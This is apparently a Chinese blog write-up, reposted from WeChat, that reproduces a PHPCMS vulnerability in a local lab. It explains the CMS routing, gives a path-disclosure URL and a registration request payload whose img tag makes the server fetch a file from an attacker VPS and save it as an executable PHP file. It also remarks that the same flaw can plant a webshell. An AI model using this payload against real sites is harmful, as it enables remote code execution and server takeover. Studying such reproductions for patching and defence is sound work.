> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0yF698xi_158GSwl73RELw)

### 预备知识

`PHPCMS`是采用`MVC`设计模式开发, 基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。

<table width="964"><thead><tr cid="n8" mdtype="table_row"><th>参数名称</th><th>描述</th><th>位置</th><th>备注</th></tr></thead><tbody><tr cid="n13" mdtype="table_row"><td>m</td><td>模型 / 模块名称</td><td><code>phpcms/modules中模块目录名称</code></td><td>必须</td></tr><tr cid="n18" mdtype="table_row"><td>c</td><td>控制器名称</td><td><code>phpcms/modules/模块/*.php 文件名称</code></td><td>必须</td></tr><tr cid="n23" mdtype="table_row"><td>a</td><td>事件名称</td><td><code>phpcms/modules/模块/*.php 中方法名称</code></td><td><br></td></tr></tbody></table>

模块访问方法 [示例]：`http://www.xxx.com/index.php?m=content&c=index&a=show&id=1`

其中 `m = content` 为模型 / 模块名称 位于 phpcms/modules/content

`c = index` 为控制器名称 位于 **phpcms/modules/content/index.php**

`a = show` 为时间名称 位于 **phpcms/modules/content/index.php** 中`show()`方法 id = 1 为其他参数 与正常 get 传递参数形式相同

还有一点就是访问`http://www.xxx.com/index.php`

phpcms 默认路由会定位到 **content** 模块的 **index** 控制器中的`init`操作，因为系统在没有指定模块和控制器的时候，会执行默认的模块和操作.

所以跟访问`http://www.xxx.com/index.php?m=content&c=index&a=init`是一样的

安装环境

```
 http://127.0.0.1/ldfx/phpcms/install/install.php
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZsjg4xGzIuIgc5OdBnwX8mHZMEkffGzqqjoOphnDT7j2oJVRyCXxtGg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZux1T0XI0ezxSBwBKRTepso0J7f6XdehIIsppf50k5m3K7BwypNHj6g/640?wx_fmt=jpeg)

后台管理地址

```
 http://127.0.0.1/ldfx/phpcms/index.php?m=admin&c=index&a=login&pc_hash=
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZX1dL2uTPKftftib4K0cR3gia0YF6Bno3XORwQhkDMJc5Lphfs5UP5h1Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZvdVdpgpicYnCoHwJc5RiaibHW7u3ialPedT6BBIpllhaz3cGqIiaFAA7qmA/640?wx_fmt=jpeg)

用户注册地址

```
 http://127.0.0.1/ldfx/phpcms/index.php?m=member&c=index&a=register&siteid=1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZHgvIH57IkXHKxicbN1PbNU93EcCVoib3eSje7xo7EmIN9Yk60E1epia2Q/640?wx_fmt=jpeg)

复现过程

爆出网站路径（只有没有设置只读权限的可以爆出路径）

```
 /phpcms/modules/attachment/templates/album_dir.tpl.php?author=111
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZ02KOMQgCXiaHic3EfhN3MuUS36WLPDp3ibD7H6fsR4SKEjQFbDSavje8Q/640?wx_fmt=jpeg)

这里开始利用，在`vps`上上传一个`txt`文件，内容如下

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZDaYanwpIgbaaP5Eic6v0y3RxaTAqPh0x4FAMrCm5J75EPiaAzpMXicZIA/640?wx_fmt=jpeg)

然后正常填写注册信息进行抓包修改`poc`

```
 siteid=1&modelid=11&username=Tao&password=123456&email=Tao@qq.com&info[content]=<img src=http://xx.xx.xx.xx/1.txt?.php#.jpg>&dosubmit=1&protocol=
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZvy5QXP2VWYOAJDPWAqe83ONyiabh8WwsdobEYTT8YM2f0UaMptqibicqQ/640?wx_fmt=jpeg)

可以看到返回了一个`php`文件地址，访问该地址显示了`phpinfo`的信息。那么我们远端`vps`上的内容已经被包含写入到了服务器中  

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOOSIJ1X44UrFaVLsPx7NjZdTdUTyT0jMQYHIGCib3hyXIxSZOLHyjuogzw4F6ia0xYpSI8McG4UrsA/640?wx_fmt=jpeg)

要注意的是在`repeater`里测试`go`时每一次都要修改`username`，`password`和`email`字段值，不能重复。否则只会默默的在服务器创建文件并返回操作失败的提示。这样的话就需要对文件进行爆破了。这里也可以借助该漏洞直接写马`getshell`。